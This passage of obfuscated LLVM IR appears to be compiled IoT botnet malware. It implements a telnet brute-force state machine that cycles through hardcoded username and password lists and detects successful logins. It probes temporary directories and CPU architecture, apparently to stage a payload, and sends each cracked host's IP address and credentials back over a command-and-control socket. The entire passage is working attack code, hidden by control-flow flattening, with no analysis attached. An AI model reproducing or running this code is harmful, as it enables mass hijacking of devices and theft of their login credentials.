  %485 = load i32, i32* %6, align 4
  %486 = sext i32 %485 to i64
  %.reload134 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload134, i64 %486
  call void @advance_telstate(%struct.telstate_t* %487, i32 0)
  store i32 -1193296816, i32* %switchVar
  br label %loopEnd

; <label>:488:                                    ; preds = %loopEntry
  %489 = load i32, i32* %6, align 4
  %490 = sext i32 %489 to i64
  %.reload133 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload133, i64 %490
  call void @advance_telstate(%struct.telstate_t* %491, i32 5)
  store i32 -1193296816, i32* %switchVar
  br label %loopEnd

; <label>:492:                                    ; preds = %loopEntry
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:493:                                    ; preds = %loopEntry
  %494 = load i32, i32* %6, align 4
  %495 = sext i32 %494 to i64
  %.reload132 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload132, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 7
  %498 = load i32, i32* %497, align 16
  %499 = add i32 %498, 7
  %500 = zext i32 %499 to i64
  %501 = call i64 @time(i64* null) #5
  %502 = icmp slt i64 %500, %501
  %503 = select i1 %502, i32 -1876379302, i32 1933207500
  store i32 %503, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  %505 = load i32, i32* %6, align 4
  %506 = sext i32 %505 to i64
  %.reload131 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload131, i64 %506
  call void @reset_telstate(%struct.telstate_t* %507)
  store i32 1933207500, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = load i32, i32* %6, align 4
  %511 = sext i32 %510 to i64
  %.reload130 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload130, i64 %511
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %512, i32 0, i32 0
  %514 = load i32, i32* %513, align 16
  %515 = load i32, i32* %6, align 4
  %516 = sext i32 %515 to i64
  %.reload129 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload129, i64 %516
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %517, i32 0, i32 5
  %519 = load i8, i8* %518, align 1
  %520 = zext i8 %519 to i64
  %521 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %520
  %522 = load i8*, i8** %521, align 8
  %523 = call i32 (i32, i8*, ...) @sockprintf(i32 %514, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.276, i32 0, i32 0), i8* %522)
  %524 = icmp slt i32 %523, 0
  %525 = select i1 %524, i32 230769834, i32 -1668199314
  store i32 %525, i32* %switchVar
  br label %loopEnd

; <label>:526:                                    ; preds = %loopEntry
  %527 = load i32, i32* %6, align 4
  %528 = sext i32 %527 to i64
  %.reload128 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload128, i64 %528
  call void @reset_telstate(%struct.telstate_t* %529)
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:530:                                    ; preds = %loopEntry
  %531 = load i32, i32* %6, align 4
  %532 = sext i32 %531 to i64
  %.reload127 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload127, i64 %532
  call void @advance_telstate(%struct.telstate_t* %533, i32 6)
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load i32, i32* %6, align 4
  %536 = sext i32 %535 to i64
  %.reload126 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload126, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 0
  %539 = load i32, i32* %538, align 16
  %540 = load i32, i32* %3, align 4
  %541 = load i32, i32* %6, align 4
  %542 = sext i32 %541 to i64
  %.reload125 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload125, i64 %542
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %543, i32 0, i32 9
  %545 = load i8*, i8** %544, align 8
  %546 = call i32 @read_until_response(i32 %539, i32 %540, i8* %545, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %547 = icmp ne i32 %546, 0
  %548 = select i1 %547, i32 -1499061505, i32 242848236
  store i32 %548, i32* %switchVar
  br label %loopEnd

; <label>:549:                                    ; preds = %loopEntry
  %550 = call i64 @time(i64* null) #5
  %551 = trunc i64 %550 to i32
  %552 = load i32, i32* %6, align 4
  %553 = sext i32 %552 to i64
  %.reload124 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload124, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 7
  store i32 %551, i32* %555, align 16
  %556 = load i32, i32* %6, align 4
  %557 = sext i32 %556 to i64
  %.reload123 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload123, i64 %557
  %559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %558, i32 0, i32 9
  %560 = load i8*, i8** %559, align 8
  %561 = call i32 @contains_fail(i8* %560)
  %562 = icmp ne i32 %561, 0
  %563 = select i1 %562, i32 -1902766380, i32 -915055145
  store i32 %563, i32* %switchVar
  br label %loopEnd

; <label>:564:                                    ; preds = %loopEntry
  %565 = load i32, i32* %6, align 4
  %566 = sext i32 %565 to i64
  %.reload122 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload122, i64 %566
  call void @advance_telstate(%struct.telstate_t* %567, i32 0)
  store i32 1577868841, i32* %switchVar
  br label %loopEnd

; <label>:568:                                    ; preds = %loopEntry
  %569 = load i32, i32* %6, align 4
  %570 = sext i32 %569 to i64
  %.reload121 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload121, i64 %570
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %571, i32 0, i32 9
  %573 = load i8*, i8** %572, align 8
  %574 = call i32 @contains_success(i8* %573)
  %575 = icmp ne i32 %574, 0
  %576 = select i1 %575, i32 1860841039, i32 -369265523
  store i32 %576, i32* %switchVar
  br label %loopEnd

; <label>:577:                                    ; preds = %loopEntry
  %578 = load i32, i32* %6, align 4
  %579 = sext i32 %578 to i64
  %.reload120 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload120, i64 %579
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %580, i32 0, i32 3
  %582 = load i8, i8* %581, align 1
  %583 = zext i8 %582 to i32
  %584 = icmp eq i32 %583, 2
  %585 = select i1 %584, i32 -826685558, i32 1939990848
  store i32 %585, i32* %switchVar
  br label %loopEnd

; <label>:586:                                    ; preds = %loopEntry
  %587 = load i32, i32* %6, align 4
  %588 = sext i32 %587 to i64
  %.reload119 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload119, i64 %588
  call void @advance_telstate(%struct.telstate_t* %589, i32 7)
  store i32 -1099549609, i32* %switchVar
  br label %loopEnd

; <label>:590:                                    ; preds = %loopEntry
  %591 = load i32, i32* @mainCommSock, align 4
  %592 = load i32, i32* %6, align 4
  %593 = sext i32 %592 to i64
  %.reload118 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload118, i64 %593
  %595 = call i8* @get_telstate_host(%struct.telstate_t* %594)
  %596 = load i32, i32* %6, align 4
  %597 = sext i32 %596 to i64
  %.reload117 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload117, i64 %597
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %598, i32 0, i32 4
  %600 = load i8, i8* %599, align 2
  %601 = zext i8 %600 to i64
  %602 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %601
  %603 = load i8*, i8** %602, align 8
  %604 = load i32, i32* %6, align 4
  %605 = sext i32 %604 to i64
  %.reload116 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload116, i64 %605
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %606, i32 0, i32 5
  %608 = load i8, i8* %607, align 1
  %609 = zext i8 %608 to i64
  %610 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %609
  %611 = load i8*, i8** %610, align 8
  %612 = call i32 (i32, i8*, ...) @sockprintf(i32 %591, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.277, i32 0, i32 0), i8* %595, i8* %603, i8* %611)
  %613 = load i32, i32* %6, align 4
  %614 = sext i32 %613 to i64
  %.reload115 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload115, i64 %614
  call void @advance_telstate(%struct.telstate_t* %615, i32 7)
  store i32 -1099549609, i32* %switchVar
  br label %loopEnd

; <label>:616:                                    ; preds = %loopEntry
  store i32 -628357251, i32* %switchVar
  br label %loopEnd

; <label>:617:                                    ; preds = %loopEntry
  %618 = load i32, i32* %6, align 4
  %619 = sext i32 %618 to i64
  %.reload114 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload114, i64 %619
  call void @reset_telstate(%struct.telstate_t* %620)
  store i32 -628357251, i32* %switchVar
  br label %loopEnd

; <label>:621:                                    ; preds = %loopEntry
  store i32 1577868841, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:623:                                    ; preds = %loopEntry
  %624 = load i32, i32* %6, align 4
  %625 = sext i32 %624 to i64
  %.reload113 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload113, i64 %625
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %626, i32 0, i32 7
  %628 = load i32, i32* %627, align 16
  %629 = add i32 %628, 7
  %630 = zext i32 %629 to i64
  %631 = call i64 @time(i64* null) #5
  %632 = icmp slt i64 %630, %631
  %633 = select i1 %632, i32 -1084871230, i32 -1154485213
  store i32 %633, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  %635 = load i32, i32* %6, align 4
  %636 = sext i32 %635 to i64
  %.reload112 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload112, i64 %636
  call void @reset_telstate(%struct.telstate_t* %637)
  store i32 -1154485213, i32* %switchVar
  br label %loopEnd

; <label>:638:                                    ; preds = %loopEntry
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:639:                                    ; preds = %loopEntry
  %640 = load i32, i32* %6, align 4
  %641 = sext i32 %640 to i64
  %.reload111 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload111, i64 %641
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %642, i32 0, i32 0
  %644 = load i32, i32* %643, align 16
  %645 = call i32 (i32, i8*, ...) @sockprintf(i32 %644, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.278, i32 0, i32 0))
  %646 = icmp slt i32 %645, 0
  %647 = select i1 %646, i32 -897510935, i32 1518758178
  store i32 %647, i32* %switchVar
  br label %loopEnd

; <label>:648:                                    ; preds = %loopEntry
  %649 = load i32, i32* %6, align 4
  %650 = sext i32 %649 to i64
  %.reload110 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload110, i64 %650
  call void @reset_telstate(%struct.telstate_t* %651)
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:652:                                    ; preds = %loopEntry
  %653 = load i32, i32* %6, align 4
  %654 = sext i32 %653 to i64
  %.reload109 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload109, i64 %654
  call void @advance_telstate(%struct.telstate_t* %655, i32 8)
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:656:                                    ; preds = %loopEntry
  store i32 0, i32* %23, align 4
  store i32 0, i32* %23, align 4
  store i32 1922010903, i32* %switchVar
  br label %loopEnd

; <label>:657:                                    ; preds = %loopEntry
  %658 = load i32, i32* %23, align 4
  %659 = icmp slt i32 %658, 5
  %660 = select i1 %659, i32 -417286665, i32 596278306
  store i32 %660, i32* %switchVar
  br label %loopEnd

; <label>:661:                                    ; preds = %loopEntry
  %662 = load i32, i32* %6, align 4
  %663 = sext i32 %662 to i64
  %.reload108 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload108, i64 %663
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %664, i32 0, i32 0
  %666 = load i32, i32* %665, align 16
  %667 = load i32, i32* %23, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tmp_dirs, i64 0, i64 %668
  %670 = load i8*, i8** %669, align 8
  %671 = load i32, i32* %23, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tmp_dirs, i64 0, i64 %672
  %674 = load i8*, i8** %673, align 8
  %675 = call i32 (i32, i8*, ...) @sockprintf(i32 %666, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.279, i32 0, i32 0), i8* %670, i8* %674)
  %676 = icmp slt i32 %675, 0
  %677 = select i1 %676, i32 1811307376, i32 -1535013995
  store i32 %677, i32* %switchVar
  br label %loopEnd

; <label>:678:                                    ; preds = %loopEntry
  %679 = load i32, i32* %6, align 4
  %680 = sext i32 %679 to i64
  %.reload107 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload107, i64 %680
  call void @reset_telstate(%struct.telstate_t* %681)
  store i32 -1906410993, i32* %switchVar
  br label %loopEnd

; <label>:682:                                    ; preds = %loopEntry
  store i32 -1906410993, i32* %switchVar
  br label %loopEnd

; <label>:683:                                    ; preds = %loopEntry
  %684 = load i32, i32* %23, align 4
  %685 = add nsw i32 %684, 1
  store i32 %685, i32* %23, align 4
  store i32 1922010903, i32* %switchVar
  br label %loopEnd

; <label>:686:                                    ; preds = %loopEntry
  %687 = load i32, i32* %6, align 4
  %688 = sext i32 %687 to i64
  %.reload106 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload106, i64 %688
  call void @advance_telstate(%struct.telstate_t* %689, i32 9)
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:690:                                    ; preds = %loopEntry
  %691 = load i32, i32* %6, align 4
  %692 = sext i32 %691 to i64
  %.reload105 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload105, i64 %692
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %693, i32 0, i32 0
  %695 = load i32, i32* %694, align 16
  %696 = call i32 (i32, i8*, ...) @sockprintf(i32 %695, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.280, i32 0, i32 0))
  %697 = icmp slt i32 %696, 0
  %698 = select i1 %697, i32 -1782660667, i32 -307333693
  store i32 %698, i32* %switchVar
  br label %loopEnd

; <label>:699:                                    ; preds = %loopEntry
  %700 = load i32, i32* %6, align 4
  %701 = sext i32 %700 to i64
  %.reload104 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload104, i64 %701
  call void @reset_telstate(%struct.telstate_t* %702)
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:703:                                    ; preds = %loopEntry
  %704 = load i32, i32* %6, align 4
  %705 = sext i32 %704 to i64
  %.reload103 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload103, i64 %705
  call void @advance_telstate(%struct.telstate_t* %706, i32 10)
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:707:                                    ; preds = %loopEntry
  %708 = load i32, i32* %6, align 4
  %709 = sext i32 %708 to i64
  %.reload102 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload102, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 0
  %712 = load i32, i32* %711, align 16
  %713 = load i32, i32* %3, align 4
  %714 = load i32, i32* %6, align 4
  %715 = sext i32 %714 to i64
  %.reload101 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload101, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %716, i32 0, i32 9
  %718 = load i8*, i8** %717, align 8
  %719 = call i32 @read_until_response(i32 %712, i32 %713, i8* %718, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @archs, i32 0, i32 0))
  %720 = icmp ne i32 %719, 0
  %721 = select i1 %720, i32 -618837526, i32 -109374924
  store i32 %721, i32* %switchVar
  br label %loopEnd

; <label>:722:                                    ; preds = %loopEntry
  %723 = load i32, i32* %6, align 4
  %724 = sext i32 %723 to i64
  %.reload100 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload100, i64 %724
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %725, i32 0, i32 9
  %727 = load i8*, i8** %726, align 8
  %728 = load i8*, i8** %26, align 8
  %729 = bitcast i8* %728 to i8**
  %730 = call i32 @contains_string(i8* %727, i8** %729)
  %731 = icmp ne i32 %730, 0
  %732 = select i1 %731, i32 1079757592, i32 1373492016
  store i32 %732, i32* %switchVar
  br label %loopEnd

; <label>:733:                                    ; preds = %loopEntry
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.281, i32 0, i32 0), i8** %25, align 8
  %734 = load i32, i32* %6, align 4
  %735 = sext i32 %734 to i64
  %.reload99 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload99, i64 %735
  call void @advance_telstate(%struct.telstate_t* %736, i32 11)
  store i32 1369066504, i32* %switchVar
  br label %loopEnd

; <label>:737:                                    ; preds = %loopEntry
  %738 = load i32, i32* %6, align 4
  %739 = sext i32 %738 to i64
  %.reload98 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload98, i64 %739
  call void @advance_telstate(%struct.telstate_t* %740, i32 0)
  store i32 1369066504, i32* %switchVar
  br label %loopEnd

; <label>:741:                                    ; preds = %loopEntry
  store i32 -109374924, i32* %switchVar
  br label %loopEnd

; <label>:742:                                    ; preds = %loopEntry
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:743:                                    ; preds = %loopEntry
  %744 = load i32, i32* %6, align 4
  %745 = sext i32 %744 to i64
  %.reload97 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload97, i64 %745
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %746, i32 0, i32 0
  %748 = load i32, i32* %747, align 16
  %749 = call i32 (i32, i8*, ...) @sockprintf(i32 %748, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.282, i32 0, i32 0))
  %750 = icmp slt i32 %749, 0
  %751 = select i1 %750, i32 1450065268, i32 1734995963
  store i32 %751, i32* %switchVar
  br label %loopEnd

; <label>:752:                                    ; preds = %loopEntry
  %753 = load i32, i32* %6, align 4
  %754 = sext i32 %753 to i64
  %.reload96 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload96, i64 %754
  call void @reset_telstate(%struct.telstate_t* %755)
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:756:                                    ; preds = %loopEntry
  %757 = load i32, i32* %6, align 4
  %758 = sext i32 %757 to i64
  %.reload95 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload95, i64 %758
  call void @advance_telstate(%struct.telstate_t* %759, i32 12)
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:760:                                    ; preds = %loopEntry
  %761 = load i32, i32* %6, align 4
  %762 = sext i32 %761 to i64
  %.reload94 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload94, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 0
  %765 = load i32, i32* %764, align 16
  %766 = load i32, i32* %3, align 4
  %767 = load i32, i32* %6, align 4
  %768 = sext i32 %767 to i64
  %.reload93 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload93, i64 %768
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %769, i32 0, i32 9
  %771 = load i8*, i8** %770, align 8
  %772 = call i32 @read_until_response(i32 %765, i32 %766, i8* %771, i32 1024, i8** getelementptr inbounds ([3 x i8*], [3 x i8*]* @checkmethod, i32 0, i32 0))
  %773 = icmp ne i32 %772, 0
  %774 = select i1 %773, i32 1237266614, i32 426386325
  store i32 %774, i32* %switchVar
  br label %loopEnd

; <label>:775:                                    ; preds = %loopEntry
  %776 = load i32, i32* %6, align 4
  %777 = sext i32 %776 to i64
  %.reload92 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload92, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 9
  %780 = load i8*, i8** %779, align 8
  %781 = load i8*, i8** %27, align 8
  %782 = bitcast i8* %781 to i8**
  %783 = call i32 @contains_string(i8* %780, i8** %782)
  %784 = icmp ne i32 %783, 0
  %785 = select i1 %784, i32 1060946446, i32 1187277607
  store i32 %785, i32* %switchVar
  br label %loopEnd

; <label>:786:                                    ; preds = %loopEntry
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8** %24, align 8
  %787 = load i32, i32* %6, align 4
  %788 = sext i32 %787 to i64
  %.reload91 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload91, i64 %788
  call void @advance_telstate(%struct.telstate_t* %789, i32 13)
  store i32 1135397183, i32* %switchVar
  br label %loopEnd

; <label>:790:                                    ; preds = %loopEntry
  %791 = load i32, i32* %6, align 4
  %792 = sext i32 %791 to i64
  %.reload90 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload90, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 9
  %795 = load i8*, i8** %794, align 8
  %796 = load i8*, i8** %28, align 8
  %797 = bitcast i8* %796 to i8**
  %798 = call i32 @contains_string(i8* %795, i8** %797)
  %799 = icmp ne i32 %798, 0
  %800 = select i1 %799, i32 374138529, i32 63623951
  store i32 %800, i32* %switchVar
  br label %loopEnd

; <label>:801:                                    ; preds = %loopEntry
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.258, i32 0, i32 0), i8** %24, align 8
  %802 = load i32, i32* %6, align 4
  %803 = sext i32 %802 to i64
  %.reload89 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload89, i64 %803
  call void @advance_telstate(%struct.telstate_t* %804, i32 14)
  store i32 1274397185, i32* %switchVar
  br label %loopEnd

; <label>:805:                                    ; preds = %loopEntry
  %806 = load i32, i32* %6, align 4
  %807 = sext i32 %806 to i64
  %.reload88 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload88, i64 %807
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %808, i32 0, i32 9
  %810 = load i8*, i8** %809, align 8
  %811 = call i32 @contains_string(i8* %810, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @echo, i32 0, i32 0))
  %812 = icmp ne i32 %811, 0
  %813 = select i1 %812, i32 -321661679, i32 -665963004
  store i32 %813, i32* %switchVar
  br label %loopEnd

; <label>:814:                                    ; preds = %loopEntry
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.283, i32 0, i32 0), i8** %24, align 8
  %815 = load i32, i32* %6, align 4
  %816 = sext i32 %815 to i64
  %.reload87 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload87, i64 %816
  call void @advance_telstate(%struct.telstate_t* %817, i32 15)
  store i32 69894592, i32* %switchVar
  br label %loopEnd

; <label>:818:                                    ; preds = %loopEntry
  %819 = load i32, i32* %6, align 4
  %820 = sext i32 %819 to i64
  %.reload86 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload86, i64 %820
  call void @advance_telstate(%struct.telstate_t* %821, i32 0)
  store i32 69894592, i32* %switchVar
  br label %loopEnd

; <label>:822:                                    ; preds = %loopEntry
  store i32 1274397185, i32* %switchVar
  br label %loopEnd

; <label>:823:                                    ; preds = %loopEntry
  store i32 1135397183, i32* %switchVar
  br label %loopEnd

; <label>:824:                                    ; preds = %loopEntry
  store i32 426386325, i32* %switchVar
  br label %loopEnd

; <label>:825:                                    ; preds = %loopEntry
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:826:                                    ; preds = %loopEntry
  %827 = load i32, i32* @mainCommSock, align 4
  %828 = load i32, i32* %6, align 4
  %829 = sext i32 %828 to i64
  %.reload85 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload85, i64 %829
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %830, i32 0, i32 1
  %832 = bitcast i32* %831 to %struct.in_addr*
  %833 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %832, i32 0, i32 0
  %834 = load i32, i32* %833, align 4
  %835 = call i8* @inet_ntoa(i32 %834) #5
  %836 = load i32, i32* %6, align 4
  %837 = sext i32 %836 to i64
  %.reload84 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload84, i64 %837
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %838, i32 0, i32 4
  %840 = load i8, i8* %839, align 2
  %841 = zext i8 %840 to i64
  %842 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %841
  %843 = load i8*, i8** %842, align 8
  %844 = load i32, i32* %6, align 4
  %845 = sext i32 %844 to i64
  %.reload83 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload83, i64 %845
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %846, i32 0, i32 5
